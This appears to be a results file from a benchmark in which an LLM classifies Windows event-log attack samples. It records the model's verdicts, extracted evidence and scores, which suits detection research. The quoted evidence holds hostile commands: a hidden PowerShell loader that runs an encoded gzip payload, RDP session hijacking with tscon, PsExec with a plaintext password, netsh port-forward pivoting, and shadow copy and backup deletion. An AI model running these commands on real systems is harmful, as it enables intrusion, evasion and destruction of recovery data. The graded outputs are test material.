# DETECTION BENCHMARK RESULTS - column glossary
# ----------------------------------------------------------------------
# Model               LLM model id used to score this run
# Filename            Source artifact analyzed (EVTX file or CSV stem)
# Difficulty          Tag from metadata.json: easy / medium / hard
# Test Set            A=Known Pattern, B=Obfuscated, C=Noise-heavy, D=Benign
# Status              processed | error | context_exceeded
# Malicious           Model verdict: YES (attack) or NO (routine/benign)
# Confidence %        Heuristic confidence from response structure quality, not model-stated (0-100)
# Alignment %         Share of cited evidence found verbatim in source (0-100)
# Structure Valid     Response parsed cleanly into the required sections
# Event IDs           Event IDs extracted from the model's EVIDENCE block
# Processes           Process names extracted from the model's EVIDENCE block
# Accounts            Account names extracted from the model's EVIDENCE block
# Commands            Command lines / script blocks extracted from EVIDENCE
# Network             IPs / hostnames / shares extracted from EVIDENCE
# Registry            Registry keys / values extracted from EVIDENCE
# Hallucination %     Share of cited evidence not found in source events (0-100)
# Response Time (s)   Wall-clock seconds from prompt sent to response received
# Extraction (6)      Did the model find the right evidence? (0-6)
# Interpretation (6)  Did it correctly explain what the evidence implies? (0-6)
# NoHallucination (4) 4 = no fabricated evidence, 0 = heavy fabrication
# Reasoning (4)       Quality of the chain of reasoning in EXPLANATION (0-4)
# Total (20)          Sum of the four criteria above (0-20)
# Grade               Letter grade from Total: A>=17, B>=14, C>=10, D<10
# LLM Response        Full raw text the model returned, before any parsing
#
# Skip these lines in pandas:  pd.read_csv(path, comment='#')
# ----------------------------------------------------------------------
Model,Filename,Difficulty,Test Set,Status,Malicious,Confidence %,Alignment %,Structure Valid,Event IDs,Processes,Accounts,Commands,Network,Registry,Hallucination %,Response Time (s),Extraction (6),Interpretation (6),NoHallucination (4),Reasoning (4),Total (20),Grade,LLM Response
<lmstudio-models>/unsloth\Qwen3.6-35B-A3B-GGUF\Qwen3.6-35B-A3B-UD-Q4_K_M.gguf,"ID5140-5145,4688,4697-Encrypted payload deployed with service over SMB (GLOBAL).csv",,,processed,YES,100.0,83.0,YES,"5140, 5145, 4697, 4688","cmd.exe, powershell.exe, conhost.exe, cscript.exe, services.exe, MonitoringHost.exe, MusNotification.exe, SecEdit.exe, MOFWriter.exe, ASMHost.exe","admmig, SRVDEFENDER01$","C:\Windows\system32\cmd.exe /b /c start /b /min powershell.exe -nop -w hidden -noni -c ""if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'} | $s=New-Object System.Diagnostics.ProcessStartInfo | $s.FileName=$b | $s.Arguments='-noni -nop -w hidden -c &amp | ([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(''H4sIAPU7gGACA7VW+2/aSBD+OZHyP1gVErZKsHlcEyJVurUdHk0gBof3odNiL/Y2ay+xFwjp9X+/WbDbVE3v2pPO4rGPmdmZb76d8WoTe4LyWBG1Zah8Ojs9cXCCI0UtPH5YlZQCtWhLOzmB9ULwUXmvqHO0Xts8wjReXF1ZmyQhsTjOyy0iUJqSaMkoSVVN+UsZhyQh53fLj8QTyiel8Ge5xfgSs0xsb2EvJMo5in25d8s9LH0pu2tGhVr844+iNj+vLMrXjxvMUrXo7lNBorLPWFFTPmvywPv9mqjFLvUSnvKVKI9pXKuWh3GKV6QH1rakS0TI/bSoQQzwSYjYJLEC0Uj146ZahKGTcA/5fkLStFhS5tLwfLH4XZ1npw42saARKXdiQRK+dkmypR5Jy20c+4wMyGoBWq5IaBwsNA3EtvyBqIV4w1hJ+RUzao/scsx+Vkl9qQRSjki0EiTxuyi73N8wctQrvuKmTLsGT556QO3z2enZ6SrnCd42ti95AqOT+WFMwDfV4Sk9yL1XjJLShXOw4MkepoX7ZEO0xRdklUJqL0s/Vq/ksiD53DD2EazNR5z6C9DJkll4vJSrP6akTVY0JvY+xhH1ctapryFMVowcIiznYj3wSS1mG8S3CSMBFhI1mejv1K4jKr7omhvKfJIgD7KUgleQQO1bZ46JUIuduEsiQOg4B+YVVsB1kktn/N7np8s5CBUthtO0pDgbuGxeSXEJZsQvKShOabaFNoIfhsWv7nY3TFAPpyI3t9COKGanWTxORbLxIGUQ+b27Jh7FTAJRUtrUJ+bepUF+avFVGCzMGFwBsLSFNMCKDN8VkggJOCiTrpVdIjrRmpEIRA5XvslwABc84/mBODggfvFb93IeH0krYcjjf+Ec5NZlXJSUEU0E1A0J6YE//+nwFxUD3LASkuVAzS/G3NwLSedC0AieJRkzSA4AJAKCbyY8MnFK3tWP1UF9o99RB8EztdvurCPcLnztTsxopTPsri4dYfCI1jq861mp02peIroLdt5lD3n+B580XJDrU6NziXzrtt8OJ6FnGveoDWvBdNgR0w5q34ceMxy7rbvT1KC79ljaOtrw6vX2xEC1Wv2uZjwAblNaCR6Q34vo7ukWxlAG727NTmoaHXb9wRosx9XmbMzaer0ZrsY8dd9NbV3XGz62u3uETO7XuvtJZcDv215k1mOuN6z6A7pGyIqvR02T30zNBDn6CAdrboX+hVUNLIRaF5TM+sOm2e83TTRsfXy0G3qgN8YTHJrjUZXO1pNBCPPmrt2/0Y16xyfPfLYD4Foc4WAAMoFV9cIVyNhvkfm2x9MqfjA5MkGmOXtErXC6bjoM9u+HVY5GrDfB6Ha2b+p6ZerUUdvg41aA+iCOA7OPUbq1n229MvK5P/6tN13powm70G2r74QTGbO+juTvrm3feLPKzru7qJvGoxXRiC2rvt4YXprx7iZwtoHfH18Mnnr7JZw71PXRG8kmoFPBC8d+5QVRflTbuzhJQ8yAQFC28/va5Ekzq8QOp1JDVQ+d+4EkMWHQ+qA55sxHjHFPtoFDzYYWdGwMsk8NYVirvjrSlC+C2tcGkS9dXc3AS7hKku7lWxIHIiwZTzXDgHJvPNUNCPPnI7P4eq8eTJVkuzhikxtnB+OavGSFVMTx/4tZdrVD+PP/DbOva/+w+1M4GqUs5u/Wv134JVR/OfYxpgIkXShOjBz74usQZAx58d4gEwP5X2WPfOm724jzHrxOnJ3+DTnHlctdCgAA''))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))' | $s.UseShellExecute=$false | $s.RedirectStandardOutput=$true | $s.WindowStyle='Hidden' | $s.CreateNoWindow=$true | $p=[System.Diagnostics.Process]::Start($s) | "", ""C:\Windows\system32\cscript.exe"" /nologo ""MonitorKnowledgeDiscovery.vbs"", C:\Windows\system32\secedit.exe /export /cfg ""C:\Program Files\Microsoft Monitoring Agent\Agent\Health Service State\Monitoring Host Temporary Files 1\26\WindowsOSBinaries\Configuration\AzureSecurityPack\secedit.inf"", C:\Windows\system32\secedit.exe /export /mergedpolicy /cfg ""C:\Program Files\Microsoft Monitoring Agent\Agent\Health Service State\Monitoring Host Temporary Files 1\26\WindowsOSBinaries\Configuration\AzureSecurityPack\secedit.inf"", C:\Windows\system32\MusNotification.exe Display, \??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1",10.23.123.11,,0.0,94.31,5.0,6.0,4.0,4,19.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 5140, 5145, 4697, 4688
- Processes: cmd.exe, powershell.exe, conhost.exe, cscript.exe, services.exe, MonitoringHost.exe, MusNotification.exe, SecEdit.exe, MOFWriter.exe, ASMHost.exe
- Accounts: admmig, SRVDEFENDER01$
- Commands: C:\Windows\system32\cmd.exe /b /c start /b /min powershell.exe -nop -w hidden -noni -c ""if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-noni -nop -w hidden -c &amp;([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(''H4sIAPU7gGACA7VW+2/aSBD+OZHyP1gVErZKsHlcEyJVurUdHk0gBof3odNiL/Y2ay+xFwjp9X+/WbDbVE3v2pPO4rGPmdmZb76d8WoTe4LyWBG1Zah8Ojs9cXCCI0UtPH5YlZQCtWhLOzmB9ULwUXmvqHO0Xts8wjReXF1ZmyQhsTjOyy0iUJqSaMkoSVVN+UsZhyQh53fLj8QTyiel8Ge5xfgSs0xsb2EvJMo5in25d8s9LH0pu2tGhVr844+iNj+vLMrXjxvMUrXo7lNBorLPWFFTPmvywPv9mqjFLvUSnvKVKI9pXKuWh3GKV6QH1rakS0TI/bSoQQzwSYjYJLEC0Uj146ZahKGTcA/5fkLStFhS5tLwfLH4XZ1npw42saARKXdiQRK+dkmypR5Jy20c+4wMyGoBWq5IaBwsNA3EtvyBqIV4w1hJ+RUzao/scsx+Vkl9qQRSjki0EiTxuyi73N8wctQrvuKmTLsGT556QO3z2enZ6SrnCd42ti95AqOT+WFMwDfV4Sk9yL1XjJLShXOw4MkepoX7ZEO0xRdklUJqL0s/Vq/ksiD53DD2EazNR5z6C9DJkll4vJSrP6akTVY0JvY+xhH1ctapryFMVowcIiznYj3wSS1mG8S3CSMBFhI1mejv1K4jKr7omhvKfJIgD7KUgleQQO1bZ46JUIuduEsiQOg4B+YVVsB1kktn/N7np8s5CBUthtO0pDgbuGxeSXEJZsQvKShOabaFNoIfhsWv7nY3TFAPpyI3t9COKGanWTxORbLxIGUQ+b27Jh7FTAJRUtrUJ+bepUF+avFVGCzMGFwBsLSFNMCKDN8VkggJOCiTrpVdIjrRmpEIRA5XvslwABc84/mBODggfvFb93IeH0krYcjjf+Ec5NZlXJSUEU0E1A0J6YE//+nwFxUD3LASkuVAzS/G3NwLSedC0AieJRkzSA4AJAKCbyY8MnFK3tWP1UF9o99RB8EztdvurCPcLnztTsxopTPsri4dYfCI1jq861mp02peIroLdt5lD3n+B580XJDrU6NziXzrtt8OJ6FnGveoDWvBdNgR0w5q34ceMxy7rbvT1KC79ljaOtrw6vX2xEC1Wv2uZjwAblNaCR6Q34vo7ukWxlAG727NTmoaHXb9wRosx9XmbMzaer0ZrsY8dd9NbV3XGz62u3uETO7XuvtJZcDv215k1mOuN6z6A7pGyIqvR02T30zNBDn6CAdrboX+hVUNLIRaF5TM+sOm2e83TTRsfXy0G3qgN8YTHJrjUZXO1pNBCPPmrt2/0Y16xyfPfLYD4Foc4WAAMoFV9cIVyNhvkfm2x9MqfjA5MkGmOXtErXC6bjoM9u+HVY5GrDfB6Ha2b+p6ZerUUdvg41aA+iCOA7OPUbq1n229MvK5P/6tN13powm70G2r74QTGbO+juTvrm3feLPKzru7qJvGoxXRiC2rvt4YXprx7iZwtoHfH18Mnnr7JZw71PXRG8kmoFPBC8d+5QVRflTbuzhJQ8yAQFC28/va5Ekzq8QOp1JDVQ+d+4EkMWHQ+qA55sxHjHFPtoFDzYYWdGwMsk8NYVirvjrSlC+C2tcGkS9dXc3AS7hKku7lWxIHIiwZTzXDgHJvPNUNCPPnI7P4eq8eTJVkuzhikxtnB+OavGSFVMTx/4tZdrVD+PP/DbOva/+w+1M4GqUs5u/Wv134JVR/OfYxpgIkXShOjBz74usQZAx58d4gEwP5X2WPfOm724jzHrxOnJ3+DTnHlctdCgAA''))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);"", ""C:\Windows\system32\cscript.exe"" /nologo ""MonitorKnowledgeDiscovery.vbs"", C:\Windows\system32\secedit.exe /export /cfg ""C:\Program Files\Microsoft Monitoring Agent\Agent\Health Service State\Monitoring Host Temporary Files 1\26\WindowsOSBinaries\Configuration\AzureSecurityPack\secedit.inf"", C:\Windows\system32\secedit.exe /export /mergedpolicy /cfg ""C:\Program Files\Microsoft Monitoring Agent\Agent\Health Service State\Monitoring Host Temporary Files 1\26\WindowsOSBinaries\Configuration\AzureSecurityPack\secedit.inf"", C:\Windows\system32\MusNotification.exe Display, \??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1
- Network: 10.23.123.11
- Registry: None

EXPLANATION:
The logs show a clear attack chain starting with the `admmig` account accessing IPC$ and ADMIN$ shares, followed by the installation of a suspicious service (`iOWamcEn`) containing a hidden PowerShell payload that decodes and executes a Base64/Gzip compressed script. This payload is subsequently executed by `cmd.exe` and `powershell.exe` under the LocalSystem account, indicating a privilege escalation and implant deployment, while the subsequent repetitive `cscript.exe` executions are benign monitoring agent activity."
<lmstudio-models>/unsloth\Qwen3.6-35B-A3B-GGUF\Qwen3.6-35B-A3B-UD-Q4_K_M.gguf,"ID4688,4778,4779 RDP hijack direct.evtx",easy,A,processed,YES,100.0,85.6,YES,"4688, 4779, 4778","cmd.exe, tscon.exe, TSTheme.exe, AtBroker.exe, rdpclip.exe, taskhostw.exe, dllhost.exe","FS01$, admmig, admmarsid","cmd  /k tscon 2 /dest:rdp-tcp#8, tscon  2 /dest:rdp-tcp#8, C:\Windows\system32\TSTheme.exe -Embedding, atbroker.exe, rdpclip, taskhostw.exe, C:\Windows\system32\DllHost.exe /Processid:{133EAC4F-5891-4D04-BADA-D84870380A80}, C:\Windows\system32\DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}, taskhostw.exe U, C:\Windows\system32\DllHost.exe /Processid:{E10F6C3A-F1AE-4ADC-AA9D-2FE65525666E}",10.23.23.9,,0.0,41.77,5.1,6.0,4.0,4,19.1,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 4688, 4779, 4778
- Processes: cmd.exe, tscon.exe, TSTheme.exe, AtBroker.exe, rdpclip.exe, taskhostw.exe, dllhost.exe
- Accounts: FS01$, admmig, admmarsid
- Commands: cmd  /k tscon 2 /dest:rdp-tcp#8, tscon  2 /dest:rdp-tcp#8, C:\Windows\system32\TSTheme.exe -Embedding, atbroker.exe, rdpclip, taskhostw.exe, C:\Windows\system32\DllHost.exe /Processid:{133EAC4F-5891-4D04-BADA-D84870380A80}, C:\Windows\system32\DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}, taskhostw.exe U, C:\Windows\system32\DllHost.exe /Processid:{E10F6C3A-F1AE-4ADC-AA9D-2FE65525666E}
- Network: 10.23.23.9
- Registry: None

EXPLANATION:
The logs demonstrate a session hijacking attack where the SYSTEM account (`FS01$`) executes `tscon` to forcibly steal an active RDP session (`RDP-Tcp#8`) from user `admmig` and reassign it to `admmarsid`. This is corroborated by the immediate sequence of Event ID 4779 (session disconnect) and 4778 (session reconnect) from the same client IP, confirming unauthorized session takeover. This pattern is a known adversarial technique for bypassing authentication and gaining persistent access to a user's environment."
<lmstudio-models>/unsloth\Qwen3.6-35B-A3B-GGUF\Qwen3.6-35B-A3B-UD-Q4_K_M.gguf,ID4688-4778 RDP hijack command execution.evtx,easy,A,processed,YES,100.0,96.5,YES,"4688, 4778","C:\Windows\System32\sc.exe, C:\Windows\System32\cmd.exe, C:\Windows\System32\tscon.exe, C:\Windows\System32\conhost.exe, C:\Windows\System32\TSTheme.exe, C:\Windows\System32\rdpclip.exe, C:\Windows\System32\AtBroker.exe, C:\Windows\System32\rdpinput.exe, C:\Windows\System32\consent.exe, C:\Windows\System32\taskhostw.exe, C:\Windows\System32\dllhost.exe, C:\Windows\System32\mmc.exe, C:\Windows\System32\backgroundTaskHost.exe","admmig, FS01$, admmarsid","sc.exe  start hijackservice, cmd.exe /k tscon 2 /dest:rdp-tcp#5, tscon  2 /dest:rdp-tcp#5, \??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1, C:\Windows\system32\TSTheme.exe -Embedding, rdpclip, atbroker.exe, ""C:\Windows\System32\rdpinput.EXE"" /pid:3820 /handle:1456, consent.exe 1072 362 000001A5ECFB0F80, taskhostw.exe, C:\Windows\system32\DllHost.exe /Processid:{E10F6C3A-F1AE-4ADC-AA9D-2FE65525666E}, C:\Windows\system32\DllHost.exe /Processid:{133EAC4F-5891-4D04-BADA-D84870380A80}, ""C:\Windows\system32\mmc.exe"" ""C:\Windows\system32\eventvwr.msc"" /s, consent.exe 1072 426 000001A5F05BA860, C:\Windows\system32\DllHost.exe /Processid:{DC4537C3-CA73-4AC7-9E1D-B2CE27C3A7A6}, ""C:\Windows\system32\backgroundTaskHost.exe"" -ServerName:CortanaUI.AppXy7vb4pc2dr3kc93kfc509b1d0arkfb2x.mca",10.23.23.9,,0.0,49.35,5.8,6.0,4.0,4,19.8,A,"</think>

MALICIOUS: YES

EVIDENCE:
- Event IDs: 4688, 4778
- Processes: C:\Windows\System32\sc.exe, C:\Windows\System32\cmd.exe, C:\Windows\System32\tscon.exe, C:\Windows\System32\conhost.exe, C:\Windows\System32\TSTheme.exe, C:\Windows\System32\rdpclip.exe, C:\Windows\System32\AtBroker.exe, C:\Windows\System32\rdpinput.exe, C:\Windows\System32\consent.exe, C:\Windows\System32\taskhostw.exe, C:\Windows\System32\dllhost.exe, C:\Windows\System32\mmc.exe, C:\Windows\System32\backgroundTaskHost.exe
- Accounts: admmig, FS01$, admmarsid
- Commands: sc.exe  start hijackservice, cmd.exe /k tscon 2 /dest:rdp-tcp#5, tscon  2 /dest:rdp-tcp#5, \??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1, C:\Windows\system32\TSTheme.exe -Embedding, rdpclip, atbroker.exe, ""C:\Windows\System32\rdpinput.EXE"" /pid:3820 /handle:1456, consent.exe 1072 362 000001A5ECFB0F80, taskhostw.exe, C:\Windows\system32\DllHost.exe /Processid:{E10F6C3A-F1AE-4ADC-AA9D-2FE65525666E}, C:\Windows\system32\DllHost.exe /Processid:{133EAC4F-5891-4D04-BADA-D84870380A80}, ""C:\Windows\system32\mmc.exe"" ""C:\Windows\system32\eventvwr.msc"" /s, consent.exe 1072 426 000001A5F05BA860, C:\Windows\system32\DllHost.exe /Processid:{DC4537C3-CA73-4AC7-9E1D-B2CE27C3A7A6}, ""C:\Windows\system32\backgroundTaskHost.exe"" -ServerName:CortanaUI.AppXy7vb4pc2dr3kc93kfc509b1d0arkfb2x.mca
- Network: 10.23.23.9
- Registry: None

EXPLANATION:
The logs show a clear attack pattern where the `admmig` account initiates a service start command for `hijackservice`, followed immediately by the `FS01$` computer account executing `tscon` to hijack an active RDP session (`rdp-tcp#5`). This session hijacking technique, combined with the subsequent spawning of RDP-related processes (`rdpclip.exe`, `rdpinput.exe`) and the user `admmarsid` logging into the stolen session from `10.23.23.9`, indicates unauthorized remote access and session takeover."
<lmstudio-models>/unsloth\Qwen3.6-35B-A3B-GGUF\Qwen3.6-35B-A3B-UD-Q4_K_M.gguf,"ID4688,4697,5140-5145 PSexec remote execution + admin share.evtx",easy,A,processed,YES,100.0,72.2,YES,"4624, 5140, 5145, 4674, 4697, 4688","PSEXESVC.exe, services.exe, cmd.exe, conhost.exe, whoami.exe, HOSTNAME.EXE, cscript.exe, MonitoringHost.exe","admmig, SRVDEFENDER01$, demo\admmig, LocalSystem","C:\Windows\PSEXESVC.exe, ""cmd.exe"" -u demo\admmig -p Admin1235 -accepteula , \??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1, whoami, hostname, ""C:\Windows\system32\cscript.exe"" /nologo ""MonitorKnowledgeDiscovery.vbs""",10.23.42.22,,0.0,45.61,4.3,6.0,4.0,4,18.3,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 4624, 5140, 5145, 4674, 4697, 4688
- Processes: PSEXESVC.exe, services.exe, cmd.exe, conhost.exe, whoami.exe, HOSTNAME.EXE, cscript.exe, MonitoringHost.exe
- Accounts: admmig, SRVDEFENDER01$, demo\admmig, LocalSystem
- Commands: C:\Windows\PSEXESVC.exe, ""cmd.exe"" -u demo\admmig -p Admin1235 -accepteula , \??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1, whoami, hostname, ""C:\Windows\system32\cscript.exe"" /nologo ""MonitorKnowledgeDiscovery.vbs""
- Network: 10.23.42.22
- Registry: None

EXPLANATION:
The logs show a clear PsExec attack chain where the account `admmig` authenticates from `10.23.42.22`, deploys `PSEXESVC.exe` to the `ADMIN$` share, and registers it as a service running as `LocalSystem`. Subsequent events confirm the service execution, followed by a `cmd.exe` process launched with embedded credentials (`-u demo\admmig -p Admin1235`) that executes reconnaissance commands like `whoami` and `hostname`, indicating active remote code execution and lateral movement."
<lmstudio-models>/unsloth\Qwen3.6-35B-A3B-GGUF\Qwen3.6-35B-A3B-UD-Q4_K_M.gguf,ID4688-4648 Lateral movement with net use.evtx,easy,A,processed,YES,100.0,90.0,YES,"4688, 4648",C:\Windows\System32\net.exe,"admmig, hack1, offsec\hack1",net  use m: \\fs03vuln\c$ /USER:offsec\hack1,fs03vuln.offsec.lan,,0.0,35.39,5.4,6.0,4.0,4,19.4,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 4688, 4648
- Processes: C:\Windows\System32\net.exe
- Accounts: admmig, hack1, offsec\hack1
- Commands: net  use m: \\fs03vuln\c$ /USER:offsec\hack1
- Network: fs03vuln.offsec.lan
- Registry: None

EXPLANATION:
The logs show the `admmig` account executing `net.exe` to map a network drive to the administrative share `c$` on `fs03vuln.offsec.lan` using explicit credentials for the `hack1` account. This is corroborated by Event ID 4648, which records an explicit credential logon to the same target server. Accessing administrative shares with explicit credentials is a common lateral movement technique used by attackers to escalate privileges and move across the network."
<lmstudio-models>/unsloth\Qwen3.6-35B-A3B-GGUF\Qwen3.6-35B-A3B-UD-Q4_K_M.gguf,ID13-RDP shadow session configuration enabled (registry).evtx,easy,A,processed,YES,100.0,88.9,YES,12,C:\Windows\system32\reg.exe,,,,HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services,0.0,29.37,5.3,6.0,4.0,4,19.3,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 12
- Processes: C:\Windows\system32\reg.exe
- Accounts: None
- Commands: None
- Network: None
- Registry: HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services

EXPLANATION:
The event logs a registry key creation under the Terminal Services policy path using reg.exe, which is explicitly tagged with the MITRE ATT&CK technique ID T1076 (Remote Desktop Protocol). Modifying these registry keys is a common adversary technique to enable, disable, or reconfigure RDP access for lateral movement or persistent remote access. Given the explicit technique tagging and the sensitive nature of the registry modification, this indicates malicious activity."
<lmstudio-models>/unsloth\Qwen3.6-35B-A3B-GGUF\Qwen3.6-35B-A3B-UD-Q4_K_M.gguf,ID5600-proxy configuration changed.evtx,easy,A,processed,YES,100.0,71.4,YES,5600,,,,"http://hacker-proxy.lan:123, http://hacker-bypass.com/, http://internal.lan",,0.0,34.89,4.3,6.0,4.0,2,16.3,B,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 5600
- Processes: None
- Accounts: None
- Commands: None
- Network: http://hacker-proxy.lan:123, http://hacker-bypass.com/, http://internal.lan
- Registry: None

EXPLANATION:
The logs show a rapid sequence of proxy configuration changes (Event ID 5600) routing traffic through a suspicious proxy server and auto-config URL with explicit ""hacker"" naming conventions. The sequential modification of proxy settings and bypass rules within a short timeframe indicates an attacker is redirecting network traffic, likely for interception or command-and-control purposes."
<lmstudio-models>/unsloth\Qwen3.6-35B-A3B-GGUF\Qwen3.6-35B-A3B-UD-Q4_K_M.gguf,ID4688-netsh RDP port forwarding abuse.evtx,easy,A,processed,YES,100.0,100.0,YES,"1102, 4688, 4964, 4672, 4624, 4627","C:\Windows\System32\netsh.exe, C:\Windows\System32\cmd.exe","admmig, FS01$","netsh  I p a v l=8001 listena=0.0.0.0 connectp=3389 c=1.1.1.1, netsh  interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=48333 connectaddress=127.0.0.1 connectport=80, netsh  interface portproxy reset","1.1.1.1, 127.0.0.1, 10.23.23.9",,0.0,39.85,6.0,6.0,4.0,4,20.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 1102, 4688, 4964, 4672, 4624, 4627
- Processes: C:\Windows\System32\netsh.exe, C:\Windows\System32\cmd.exe
- Accounts: admmig, FS01$
- Commands: netsh  I p a v l=8001 listena=0.0.0.0 connectp=3389 c=1.1.1.1, netsh  interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=48333 connectaddress=127.0.0.1 connectport=80, netsh  interface portproxy reset
- Network: 1.1.1.1, 127.0.0.1, 10.23.23.9
- Registry: None

EXPLANATION:
The logs show the account admmig clearing the security event log (Event 1102) to destroy forensic evidence, immediately followed by the execution of netsh commands to configure and then reset port proxy rules (Event 4688). This pattern of anti-forensics combined with network pivoting via port redirection and the acquisition of high-privilege special rights (Events 4672/4964) strongly indicates malicious activity aimed at lateral movement and cover-up."
<lmstudio-models>/unsloth\Qwen3.6-35B-A3B-GGUF\Qwen3.6-35B-A3B-UD-Q4_K_M.gguf,ID4688-Delete VSS backup (WMI).evtx,easy,A,processed,YES,100.0,100.0,YES,4688,"C:\Windows\System32\wbem\WMIC.exe, C:\Windows\System32\VSSVC.exe, C:\Windows\System32\svchost.exe","admmig, FS03$","wmic  shadowcopy delete /nointeractive, C:\Windows\system32\vssvc.exe, C:\Windows\System32\svchost.exe -k swprv",,,0.0,29.40,6.0,6.0,4.0,4,20.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 4688
- Processes: C:\Windows\System32\wbem\WMIC.exe, C:\Windows\System32\VSSVC.exe, C:\Windows\System32\svchost.exe
- Accounts: admmig, FS03$
- Commands: wmic  shadowcopy delete /nointeractive, C:\Windows\system32\vssvc.exe, C:\Windows\System32\svchost.exe -k swprv
- Network: None
- Registry: None

EXPLANATION:
The command `wmic  shadowcopy delete /nointeractive` executed by `admmig` is a recognized defense evasion technique used to destroy volume shadow copies and prevent forensic recovery. The immediate subsequent execution of VSS-related services (`vssvc.exe` and `svchost.exe -k swprv`) by the `FS03$` account confirms the system is processing this destructive command, indicating malicious intent rather than routine administration."
<lmstudio-models>/unsloth\Qwen3.6-35B-A3B-GGUF\Qwen3.6-35B-A3B-UD-Q4_K_M.gguf,ID4688-Delete Window backup (webadmin).evtx,easy,A,processed,YES,100.0,100.0,YES,"1102, 4688","C:\Windows\System32\wbadmin.exe, C:\Windows\System32\wbem\WMIADAP.exe, C:\Windows\System32\wbem\WmiPrvSE.exe","admmig, FS03$","wbadmin  delete backup -backupTarget:m:\ -deleteOldest, wmiadap.exe /R /T, C:\Windows\system32\wbem\wmiprvse.exe -Embedding",,,0.0,36.64,6.0,6.0,4.0,4,20.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 1102, 4688
- Processes: C:\Windows\System32\wbadmin.exe, C:\Windows\System32\wbem\WMIADAP.exe, C:\Windows\System32\wbem\WmiPrvSE.exe
- Accounts: admmig, FS03$
- Commands: wbadmin  delete backup -backupTarget:m:\ -deleteOldest, wmiadap.exe /R /T, C:\Windows\system32\wbem\wmiprvse.exe -Embedding
- Network: None
- Registry: None

EXPLANATION:
The logs show user `admmig` clearing the security event log (Event ID 1102) followed immediately by executing `wbadmin.exe` to delete the oldest backup from drive M:, which are classic defense evasion and data destruction techniques. While the subsequent WMI process creations by the `FS03$` account are standard system behavior, the targeted log clearing and backup deletion by a specific user account strongly indicate malicious activity aimed at covering tracks and disrupting recovery capabilities."
<lmstudio-models>/unsloth\Qwen3.6-35B-A3B-GGUF\Qwen3.6-35B-A3B-UD-Q4_K_M.gguf,ID800-4103-4104-Delete VSS backup (PowerShell).evtx,easy,A,error,NO,0.0,0.0,NO,,,,,,,,51.56,,,,,,,"Error: HTTPConnectionPool(host='host-B', port=8080): Max retries exceeded with url: /v1/chat/completions (Caused by ConnectTimeoutError(<HTTPConnection(host='host-B', port=8080) at 0x17c9d7e9310>, 'Connection to host-B timed out. (connect timeout=269.49508333206177)'))"
